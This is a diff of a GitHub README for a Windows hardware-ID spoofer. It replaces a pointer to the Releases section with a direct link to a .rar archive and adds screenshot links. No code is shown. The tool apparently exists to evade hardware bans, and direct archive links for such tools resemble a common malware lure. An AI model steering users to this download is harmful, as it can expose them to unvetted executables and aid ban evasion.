@@ -6,8 +6,8 @@ Perfect And Fast HWID-Changer 🛸
 **Windows 11** Version 10.0.22621 Build 22621 ✅                                      
 **Windows 10** Version 22H2 Build 19045.2965 ✅
 
-## Important!
-+ **If you want to see the ready and smoothly compiled version of the program, you can download it from the "Relase" section.**
+## Download
+🚀 Install --> [Releases](https://github.com/scretox/Hwid-Temp-Spoofer/releases/download/v2.8/Relase.rar)
 
 
 
@@ -52,8 +52,8 @@ Perfect And Fast HWID-Changer 🛸
 
 
 # GUI PREVIEW 🏆
-[No Updates for the CLI Version!]
-
+![2](https://github.com/scretox/Hwid-Temp-Spoofer/assets/159569418/70515024-b97e-49d2-80e3-bd279ae0a681)
+![1](https://github.com/scretox/Hwid-Temp-Spoofer/assets/159569418/ce429f93-12a1-48b9-8978-2dc42aff3b0e)
 
 
 # 📄・License
